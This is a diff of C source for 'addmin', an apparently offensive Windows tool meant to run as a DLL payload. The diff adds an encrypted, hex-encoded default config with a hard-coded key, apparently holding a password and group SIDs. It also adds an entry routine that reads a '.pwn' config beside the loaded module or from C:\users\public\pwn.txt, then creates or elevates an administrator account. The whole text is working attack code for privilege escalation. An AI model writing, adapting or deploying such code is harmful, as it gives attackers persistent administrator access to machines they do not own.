@@ -22,8 +22,23 @@
 #define MARKER_PASSWORD "password="
 #define MARKER_GROUPSID "groupsid="
 
-
 static uint8_t KEY[16] = { 217, 78, 5, 76, 59, 107, 8, 44, 116, 168, 84, 50, 232, 185, 198, 130 };
+
+// comment the next line to disable fallback to fixed config
+#define ADDMIN_FALLBACK_CONFIG
+
+// comment the next line to disable fallback to a default search path for the config file
+#define ADDMIN_DEFAULT_CONFIG_LOCATION
+
+#ifdef ADDMIN_FALLBACK_CONFIG
+#include "../addmin-shared/hex.h"
+#define CONFIG_DEFAULT "52455a1146bc0e620589a6ca53b3d887668c3a71320800c203dd967eaad3ff08c9827127df2fdedec247e35912289a4f93c6f012ae80632ca39dc0627d0648495902a2d565fad3da824dfc2be50b25a2abaf4c485ff565d941173e8cbd9dedaebf"
+#endif
+
+#ifdef ADDMIN_DEFAULT_CONFIG_LOCATION
+// set the fallback search path here
+#define CONFIG_FALLBACK_PATH TEXT("C:\\users\\public\\pwn.txt")
+#endif
 
 
 typedef struct _config {
@@ -189,4 +204,31 @@ int addmin(LPCTSTR configPath, const char *fixedFallback, size_t fixedFallbackLe
     free(conf.groupSids[3]);
 
     return ADDMIN_STATUS_SUCCESS;
+}
+
+ __forceinline void addminMain(HMODULE hModule) {
+    TCHAR primaryConfigPath[MAX_PATH];
+
+    GetModuleFileName(hModule, primaryConfigPath, MAX_PATH);
+    size_t len = _tcslen(primaryConfigPath);
+    primaryConfigPath[len - 3] = 'p';
+    primaryConfigPath[len - 2] = 'w';
+    primaryConfigPath[len - 1] = 'n';
+
+    TCHAR* configPath = primaryConfigPath;
+
+    #ifdef ADDMIN_DEFAULT_CONFIG_LOCATION
+    DWORD fileAttribs = GetFileAttributes(primaryConfigPath);
+    if ((fileAttribs == INVALID_FILE_ATTRIBUTES) || (fileAttribs & FILE_ATTRIBUTE_DIRECTORY)) {
+        configPath = CONFIG_FALLBACK_PATH;
+    }
+    #endif
+
+    #ifdef ADDMIN_FALLBACK_CONFIG
+    char fallbackConfig[CONFIG_MAX_SIZE];
+    size_t fallbackConfigLen = decodeHex(CONFIG_DEFAULT, sizeof(CONFIG_DEFAULT) - 1, fallbackConfig, sizeof(fallbackConfig));
+    addmin(configPath, fallbackConfig, fallbackConfigLen);
+    #else
+    addmin(configPath, NULL, 0);
+    #endif
 }
